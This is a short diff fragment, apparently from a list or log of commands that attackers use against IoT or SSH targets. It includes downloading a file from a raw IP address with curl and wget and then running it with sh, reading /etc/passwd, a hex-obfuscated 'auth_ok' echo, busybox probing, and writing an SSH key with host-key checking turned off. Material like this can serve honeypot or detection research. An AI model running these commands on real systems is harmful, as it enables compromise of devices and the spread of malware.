@@ -21,9 +21,9 @@ curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
+echo xsec
 cat /etc/passwd
 echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
-echo xsec
 id
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
 /bin/busybox TOKEN
